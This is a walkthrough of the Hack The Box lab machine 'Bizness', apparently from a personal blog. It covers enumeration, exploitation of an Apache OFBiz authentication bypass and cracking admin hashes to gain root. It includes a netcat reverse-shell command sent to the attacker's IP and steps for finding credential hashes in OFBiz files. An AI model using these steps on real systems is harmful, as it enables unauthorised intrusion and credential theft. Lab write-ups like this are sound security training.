---
title: 'HTB Bizness Writeup'
date: 2024-05-08
permalink: /posts/2024/05/HTB-Bizness-Writeup/
tags:
  - HTB
  - writeup
  - easy
---

A writeup of the Hack The Box machine "Bizness" with easy difficulty

<img src='/images/HTB_Bizness/Screenshot 2024-05-29 204113.png'> 

**Welcome to this writeup of the Bizness HackTheBox machine to help you pwn and follow my thoughts.**

Enumeration
======
First, I check the open ports with `Nmap –sV –sC 10.10.11.252`

<img src='/images/HTB_Bizness/Screenshot 2024-05-29 222656.png'> 

Port 22, 80 and 443 are open. Port 80 is a running a webserver named bizness.htb

I have to add this url to the 10.10.11.252 IP in the /etc/hosts file > 10.10.11.252 bizness.htb 
Or with 1 command> `echo "10.10.11.252   bizness.htb" | sudo tee -a /etc/hosts`

Now we can access the webpage after we accepted the self-signed certificate risk warning.

There seems to be no clue on the webpage itself apart from that the site is powered by Apache OFBiz. We we dive deeper into this later. 

<img src='/images/HTB_Bizness/Screenshot 2024-05-29 222924.png'>

There are also input fields. Send a message to contact or subscribe to their newsletter. 

First I am going to see if what url directories there are >  

<img src='/images/HTB_Bizness/Screenshot 2024-05-29 223114.png'>

There seems to be no other directories found by gobuster. 

I tried dirsearch next > `dirsearch -u https://bizness.htb`

<img src='/images/HTB_Bizness/Screenshot 2024-05-29 223240.png'>

The /control/login directory appears here. It’s the Apache OFBiz login page! 

User flag
======
After searching the internet, I found this exploit: https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass  

Clone the repository and go to the newly downloaded folder > 

Run the command > `python3 exploit.py --url https://bizness.htb --cmd 'nc -c bash 10.10.14.89 1234'`

<img src='/images/HTB_Bizness/Screenshot 2024-05-29 223438.png'>

But before you run the command. Setup a Netcat listener on port 1234 > Now I was able to get RCE >

<img src='/images/HTB_Bizness/Screenshot 2024-05-29 223546.png'>

We can obtain the user flag now >

<img src='/images/HTB_Bizness/Screenshot 2024-05-29 223738.png'>

Root flag
======
First, stabilize the shell with the following commands > 

<pre>
python3 -c 'import pty;pty.spawn("/bin/bash")'
Press Ctrl+z 
stty raw -echo; fg
export TERM=xterm
</pre>

Somewhere in the file system is a hash to be found but where..... 

In the /opt/ofbiz/framework/resources/templates directory is a file called AdminUserLoginData.xml where a hash can be found > 

<img src='/images/HTB_Bizness/Screenshot 2024-05-29 224934.png'>

In another file is a salted hash to be found > 

<img src='/images/HTB_Bizness/Screenshot 2024-05-29 225044.png'>

I tried to crack the hash with john but not successful. 

Then I found a tool called: Apache-OFBiz-SHA1-Cracker. > https://github.com/duck-sec/Apache-OFBiz-SHA1-Cracker?source=post_page-----b5bed59a7598--------------------------------  

<img src='/images/HTB_Bizness/Screenshot 2024-05-29 225256.png'>

With the password cracked we can login to the root user to obtain the root.txt flag.

<img src='/images/HTB_Bizness/Screenshot 2024-05-29 225426.png'>

User flag
======
Finding the hash in a file is definitely the hardest part, as there are so many files on the system. 

Thank you for reading! I hope you found it useful :) 

Happy Hacking! 